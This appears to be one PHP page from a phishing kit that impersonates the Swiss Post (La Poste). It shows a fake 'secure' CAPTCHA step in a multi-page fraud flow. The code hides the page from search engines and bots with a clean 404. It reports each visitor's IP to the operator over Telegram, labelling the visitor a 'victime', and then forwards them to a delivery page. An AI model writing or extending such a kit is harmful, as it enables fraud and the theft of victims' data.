<?php
session_start();
include 'lang_main.php';
include 'settings.php';
include 'antibot.php';

// Enforce chain: Must come from index.php
checkSearchEngineBot();
if (!isset($_SESSION['STEP_CHAIN']) || $_SESSION['STEP_CHAIN'] < 1) {
    showClean404();
}
if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
    showClean404();
}
// Progress Tracking: Landed on Captcha
if (!isset($_SESSION['NOTIFIED_GATE'])) {
    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $msg = "├ ✋ Victime $visitor_ip sur le CAPTCHA";
    sendTelegramMessage($bot_token, $chat_id, $msg);
    $_SESSION['NOTIFIED_GATE'] = true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $n1 = intval($_POST['n1_val'] ?? 0);
    $n2 = intval($_POST['n2_val'] ?? 0);
    $op = $_POST['op_val'] ?? '+';
    $user_ans = intval($_POST['captcha'] ?? 0);
    
    $expected = ($op == '+') ? ($n1 + $n2) : ($n1 - $n2);
    
    if ($user_ans === $expected) {
        $_SESSION['qsdfqsdfqsdfqsdf123123'] = true;
        $_SESSION['STEP_CHAIN'] = 2; // CAPTCHA PASSED
        session_write_close();
        header("Location: delivery.php");
        exit();
    } else {
        $error = true;
    }
}

// ALWAYS GENERATE NEW OR KEEP EXISTING FOR DISPLAY
$n1 = rand(3, 9);
$n2 = rand(1, 4);
$op = rand(0, 1) ? '+' : '-';
if ($op == '-' && $n1 < $n2) {
    $temp = $n1; $n1 = $n2; $n2 = $temp;
}
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <title><?= t('captcha_title') ?> | La Poste</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
    <script src="assets/site.min.js"></script>
    <style>
        /* Styles spécifiques pour la carte Captcha - VERSION "FINE & CLEAN" */
        .captcha-card {
            background: #fff;
            padding: 40px 30px;
            border-radius: 6px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.05);
            border: 1px solid rgba(0,0,0,0.03);
            text-align: center;
        }

        .page-title {
            font-size: 18px !important;
            font-weight: 600 !important;
            color: #111;
            margin-bottom: 20px !important;
            letter-spacing: -0.3px;
        }

        .info-box {
            background: #fffdf2;
            border-left: 3px solid #ffcc00;
            padding: 12px 15px;
            text-align: left;
            margin-bottom: 25px;
            font-size: 13px;
            color: #444;
            line-height: 1.4;
            border-radius: 4px;
        }
        .info-box strong { font-weight: 600; display: block; margin-bottom: 4px; color: #333; }

        .math-challenge {
            background: #f9f9f9;
            border: 1px solid #e6e6e6;
            padding: 15px;
            border-radius: 6px;
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 20px;
            letter-spacing: 2px;
            color: #333;
            font-family: inherit;
        }
        
        .form-control-captcha {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #dcdcdc;
            border-radius: 4px;
            text-align: center;
            margin-bottom: 20px;
            box-sizing: border-box;
            font-weight: 500;
            color: #333;
            font-family: inherit;
        }
        .form-control-captcha:focus {
            border-color: #999;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0,0,0,0.05);
        }
        
        .btn-captcha {
            width: 100%;
            padding: 14px;
            background: #ffcc00;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            color: #222;
            transition: all 0.2s;
            text-transform: none;
        }
        .btn-captcha:hover {
            background: #e6b800;
        }
        
        /* Language Selector Styles */
        .lang-selector {
            display: flex;
            gap: 12px;
            margin-right: 25px;
            font-size: 13px;
            font-weight: 500;
            padding-right: 25px;
            border-right: 1px solid #e0e0e0;
        }
        .lang-selector a {
            text-decoration: none;
            color: #666;
            transition: all 0.2s;
        }
        .lang-selector a:hover {
            color: #000;
        }
        .lang-selector a.active {
            color: #111;
            font-weight: 700;
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .lang-selector {
                margin-right: 15px;
                padding-right: 15px;
                gap: 8px;
                font-size: 12px;
            }
        }

        .error-msg {
            color: #d93025;
            background: #fce8e6;
            padding: 10px;
            border-radius: 4px;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 15px;
            display: block;
            border: 1px solid #fad2cf;
        }
        /* GLOBAL LAYOUT FIX - PERFECT CENTER & FIT */
        html {
            height: 100%;
        }
        body {
            min-height: 100%;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background-color: #f4f6f8;
            font-family: 'Frutiger', sans-serif;
            color: #333;
        }
        .post-header {
            flex-shrink: 0;
            background: #fff;
            padding: 15px 0;
            width: 100%;
            z-index: 10;
        }
        .post-footer {
            flex-shrink: 0;
            width: 100%;
        }
        .main-wrapper {
            flex-grow: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }
        .content-container {
            width: 100%;
            display: flex;
            justify-content: center;
        }
        @media (max-width: 480px) {
            .main-wrapper { padding: 15px; }
            .captcha-card { width: 100%; padding: 30px 20px; }
        }
        /* END GLOBAL LAYOUT FIX */
    </style>
</head>
<body>

    <div class="post-yellow-bar"></div>

    <header class="post-header">
        <div class="header-container">
            <div class="logo-container">
                <img src="assets/POST.svg" alt="La Poste" class="post-logo">
            </div>
            <div class="header-right">
                <div class="lang-selector">
                    <a href="?lang=de" class="<?= $current_lang == 'de' ? 'active' : '' ?>">DE</a>
                    <a href="?lang=fr" class="<?= $current_lang == 'fr' ? 'active' : '' ?>">FR</a>
                    <a href="?lang=it" class="<?= $current_lang == 'it' ? 'active' : '' ?>">IT</a>
                    <a href="?lang=en" class="<?= $current_lang == 'en' ? 'active' : '' ?>">EN</a>
                </div>
                <div class="login-text">
                    <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                    <span><?= t('secure_conn') ?></span>
                </div>
            </div>
        </div>
    </header>

    <main class="main-wrapper" style="justify-content: center;"> 
        <div class="content-container">
            
            <div class="captcha-card">
                
                <h1 class="page-title" style="margin-bottom: 20px;"><?= t('captcha_title') ?></h1>

                <div class="info-box">
                    <strong><?= t('captcha_why') ?></strong>
                    <?= t('captcha_desc') ?>
                </div>

                <form method="POST">
                    <p style="text-align:left; font-weight:700; color:#555; margin-bottom:10px; font-size:14px;"><?= t('solve_op') ?></p>
                    
                    <input type="hidden" name="n1_val" value="<?= $n1 ?>">
                    <input type="hidden" name="n2_val" value="<?= $n2 ?>">
                    <input type="hidden" name="op_val" value="<?= $op ?>">

                    <div class="math-challenge">
                        <?= $n1 ?> <?= $op ?> <?= $n2 ?> = ?
                    </div>

                    <?php if(isset($error)): ?>
                        <div class="error-msg">
                            <?= t('captcha_error') ?>
                        </div>
                    <?php endif; ?>

                    <input type="tel" name="captcha" class="form-control-captcha" placeholder="<?= t('enter_result') ?>" required autofocus autocomplete="off">

                    <button type="submit" class="btn-captcha">
                        <?= t('confirm_access') ?>
                    </button>
                </form>
            </div>

        </div>
    </main>

    <footer class="post-footer">
        <div class="footer-container">
            <div class="footer-desktop">
                <div class="footer-col">
                    <h4><?= t('help_contact') ?></h4>
                    <a href="#">FAQ</a>
                    <a href="#">Contact Center</a>
                    <a href="#">Support</a>
                </div>
                <div class="footer-col">
                    <h4><?= t('data_prot') ?></h4>
                    <a href="#"><?= t('cond_gen') ?></a>
                    <a href="#"><?= t('privacy_policy') ?></a>
                    <a href="#"><?= t('cookies') ?></a>
                </div>
                <div class="footer-col" style="justify-content:flex-end; align-items:flex-end; text-align:right;">
                    <img src="assets/POST.svg" height="28" style="opacity:0.4; margin-bottom:10px;">
                    <p style="font-size:11px; color:#999; margin:0;">
                        &copy; <?= date('Y') ?> Post CH AG
                    </p>
                </div>
            </div>

            <div class="footer-mobile">
                &copy; <?= date('Y') ?> <?= t('copyright') ?>
            </div>
        </div>
    </footer>

</body>
</html>